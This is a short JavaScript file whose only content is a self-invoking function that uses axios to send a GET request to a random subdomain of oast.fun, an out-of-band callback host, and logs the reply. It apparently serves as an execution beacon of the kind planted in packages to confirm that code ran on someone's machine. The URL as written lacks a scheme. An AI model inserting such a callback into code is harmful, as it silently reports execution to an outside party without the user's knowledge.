import axios from "axios";

(async function sendRequest() {
    try {
        const response = await axios.get(
            "yldltzlfsgobpsuhvgow8529wsnmpynjq.oast.fun",
        );
        console.log(response.data);
    } catch (error) {
        console.error("Error making request:", error);
    }
})();
